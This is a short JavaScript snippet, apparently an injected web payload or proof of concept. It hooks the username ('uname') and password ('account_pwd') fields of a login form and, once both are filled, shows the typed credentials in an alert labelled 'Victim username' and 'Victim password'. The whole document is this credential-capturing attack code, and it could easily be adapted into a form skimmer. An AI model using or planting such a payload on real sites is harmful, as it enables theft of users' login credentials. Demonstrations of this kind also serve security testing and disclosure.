let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('uname')[0];
    const input2 = document.getElementById('account_pwd');

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim username: '+document.getElementsByName('uname')[0].value+'\n\nVictim password: '+document.getElementById('account_pwd').value);
         
        }, 7500); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('uname')[0].addEventListener('input', checkInputs);
  document.getElementById('account_pwd').addEventListener('input', checkInputs);
